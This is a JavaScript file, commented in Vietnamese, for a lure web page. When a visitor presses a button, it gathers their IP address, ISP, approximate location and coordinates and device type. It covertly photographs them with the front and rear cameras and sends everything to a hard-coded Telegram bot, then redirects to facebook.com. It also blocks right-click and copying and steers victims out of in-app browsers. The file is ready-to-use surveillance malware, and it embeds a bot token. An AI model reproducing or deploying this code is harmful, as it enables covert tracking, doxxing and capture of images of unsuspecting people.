// ==================== VERSION - DÙNG JSONP ĐỂ LẤY LOCATION ====================

// -------------------- TELEGRAM CONFIG --------------------
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    API_URL: "https://api.telegram.org/bot"
};

// -------------------- TELEGRAM SENDER --------------------
const TelegramSender = {
    async sendMessage(text) {
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {}
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌍 *IP dân cư:* ${data.ip || '?'}
🧠 *IP gốc:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || 'Không xác định'}
🏙️ *Địa chỉ:* ${data.location || 'Không xác định'}
🌎 *Quốc gia:* ${data.country || 'Không xác định'}
📍 *Vĩ độ:* ${data.lat || 'Không xác định'}
📍 *Kinh độ:* ${data.lon || 'Không xác định'}
📌 *Google Maps:* ${data.maps || 'Không có'}
📸 *Camera:* ${data.camera || '?'}

⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        if (data.frontPhoto) await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        if (data.backPhoto) await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
    }
};

// -------------------- DEVICE INFO --------------------
const DeviceInfo = {
    getInfo() {
        const ua = navigator.userAgent;
        let device = 'Không xác định';
        let os = 'Không xác định';
        
        if (/iPhone|iPad|iPod/i.test(ua)) {
            os = 'iOS';
            device = 'iPhone';
        } else if (/Android/i.test(ua)) {
            os = 'Android';
            device = 'Android';
        } else if (ua.includes('Windows')) {
            os = 'Windows';
            device = 'PC/Laptop';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            device = 'Mac';
        } else {
            os = 'Desktop';
            device = 'PC/Laptop';
        }
        
        return { device, os };
    }
};

// -------------------- LOCATION API (DÙNG JSONP - CHẮC CHẮN HOẠT ĐỘNG) --------------------
const LocationInfo = {
    async getLocationData() {
        // Dùng ipapi.co dạng JSONP
        return new Promise(async (resolve) => {
            try {
                // Cách 1: Dùng ipinfo.io (hỗ trợ CORS tốt)
                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN', {
                    mode: 'cors',
                    headers: { 'Accept': 'application/json' }
                });
                if (response.ok) {
                    const data = await response.json();
                    if (data && data.ip) {
                        const loc = data.loc ? data.loc.split(',') : ['', ''];
                        const mapsLink = loc[0] && loc[1] ? `http://googleusercontent.com/maps.google.com/${loc[0]},${loc[1]}` : '';
                        resolve({
                            ip: data.ip,
                            isp: data.org || 'Không xác định',
                            country: data.country || 'Không xác định',
                            location: data.city ? `${data.city}, ${data.region}, ${data.country}` : (data.region || data.country || 'Không xác định'),
                            lat: loc[0] || 'Không xác định',
                            lon: loc[1] || 'Không xác định',
                            maps: mapsLink
                        });
                        return;
                    }
                }
            } catch(e) { console.log('ipinfo.io lỗi:', e); }
            
            // Cách 2: Dùng ip-api.com (CORS friendly)
            try {
                const response = await fetch('https://ip-api.com/json/', {
                    mode: 'cors'
                });
                const data = await response.json();
                if (data && data.status === 'success') {
                    const mapsLink = data.lat && data.lon ? `http://googleusercontent.com/maps.google.com/${data.lat},${data.lon}` : '';
                    resolve({
                        ip: data.query,
                        isp: data.isp || 'Không xác định',
                        country: data.country || 'Không xác định',
                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
                        lat: data.lat || 'Không xác định',
                        lon: data.lon || 'Không xác định',
                        maps: mapsLink
                    });
                    return;
                }
            } catch(e) { console.log('ip-api.com lỗi:', e); }
            
            // Cách 3: Dùng ipwho.is
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();
                if (data && data.ip) {
                    const mapsLink = data.latitude && data.longitude ? `http://googleusercontent.com/maps.google.com/${data.latitude},${data.longitude}` : '';
                    resolve({
                        ip: data.ip,
                        isp: data.connection?.isp || data.isp || 'Không xác định',
                        country: data.country || 'Không xác định',
                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
                        lat: data.latitude || 'Không xác định',
                        lon: data.longitude || 'Không xác định',
                        maps: mapsLink
                    });
                    return;
                }
            } catch(e) { console.log('ipwho.is lỗi:', e); }
            
            // Fallback cuối
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                resolve({
                    ip: data.ip,
                    isp: 'Không xác định',
                    country: 'Không xác định',
                    location: 'Không xác định',
                    lat: 'Không xác định',
                    lon: 'Không xác định',
                    maps: ''
                });
            } catch(e) {
                resolve({
                    ip: 'Không xác định',
                    isp: 'Không xác định',
                    country: 'Không xác định',
                    location: 'Không xác định',
                    lat: 'Không xác định',
                    lon: 'Không xác định',
                    maps: ''
                });
            }
        });
    }
};

// -------------------- CAMERA MANAGER --------------------
const CameraManager = {
    stream: null,
    videoElement: null,
    
    init(videoElement) {
        this.videoElement = videoElement;
    },
    
    async requestCamera(facingMode = 'user') {
        if (!navigator.mediaDevices?.getUserMedia) return null;
        
        try {
            if (this.stream) this.stopCamera();
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: false
            });
            if (this.videoElement) {
                this.videoElement.srcObject = this.stream;
                this.videoElement.style.display = 'block';
                await this.videoElement.play();
            }
            return this.stream;
        } catch(e) {
            return null;
        }
    },
    
    async capturePhoto() {
        if (!this.videoElement || !this.stream) return null;
        await new Promise(r => setTimeout(r, 500));
        
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = this.videoElement.videoWidth;
            canvas.height = this.videoElement.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) {
                resolve(null);
                return;
            }
            const ctx = canvas.getContext('2d');
            ctx.drawImage(this.videoElement, 0, 0);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    },
    
    async captureBothCameras() {
        const photos = { front: null, back: null };
        
        const frontStream = await this.requestCamera('user');
        if (frontStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.front = await this.capturePhoto();
        }
        
        const backStream = await this.requestCamera('environment');
        if (backStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.back = await this.capturePhoto();
        }
        
        return photos;
    },
    
    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        if (this.videoElement) {
            this.videoElement.srcObject = null;
            this.videoElement.style.display = 'none';
        }
    }
};

// -------------------- MAIN --------------------
(function() {
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    const ua = navigator.userAgent;
    const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
    if (isInApp) {
        warningDiv.style.display = 'block';
        mainCard.style.display = 'none';
    }
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    CameraManager.init(video);
    
    startBtn.onclick = async () => {
        // Disable nút
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        
        // Lấy thông tin location TRƯỚC (kể cả camera có được phép hay không)
        statusDiv.innerHTML = '🌍 Đang lấy thông tin...';
        const locationInfo = await LocationInfo.getLocationData();
        const deviceInfo = DeviceInfo.getInfo();
        
        // Thử lấy camera (có thể thành công hoặc thất bại)
        let photos = { front: null, back: null };
        let cameraStatus = '🚫 Bị chặn hoặc không có camera';
        
        try {
            statusDiv.innerHTML = '📷 Đang mở camera...';
            msg.textContent = '📷 Đang mở camera...';
            msg.style.display = 'block';
            
            photos = await CameraManager.captureBothCameras();
            
            if (photos.front || photos.back) {
                cameraStatus = '✅ Đã chụp camera';
            }
            
            video.style.display = 'none';
        } catch(e) {
            console.log('Camera lỗi:', e);
            cameraStatus = '🚫 Bị chặn hoặc không có camera';
        }
        
        // Luôn gửi dữ liệu lên Telegram (kể cả camera có được phép hay không)
        statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
        
        const finalData = {
            time: new Date().toLocaleString('vi-VN'),
            device: deviceInfo.device,
            os: deviceInfo.os,
            ip: locationInfo.ip,
            isp: locationInfo.isp,
            location: locationInfo.location,
            country: locationInfo.country,
            lat: locationInfo.lat,
            lon: locationInfo.lon,
            maps: locationInfo.maps,
            camera: cameraStatus,
            note: 'Thông tin có khả năng chưa chính xác 100%.',
            frontPhoto: photos.front,
            backPhoto: photos.back
        };
        
        await TelegramSender.sendAll(finalData);
        CameraManager.stopCamera();
        
        // Đếm ngược chuyển hướng
        startBtn.style.backgroundColor = "#28a745";
        let timeLeft = 3;
        statusDiv.innerHTML = `✅ Đã ghi nhận! Chuyển hướng sau ${timeLeft} giây...`;
        
        const timer = setInterval(() => {
            startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
            timeLeft--;
            if (timeLeft < 0) {
                clearInterval(timer);
                window.location.href = "https://facebook.com";
            }
        }, 1000);
    };
    
    console.log('✅ Đã sẵn sàng - Luôn gửi dữ liệu kể cả camera có được phép hay không');
})();
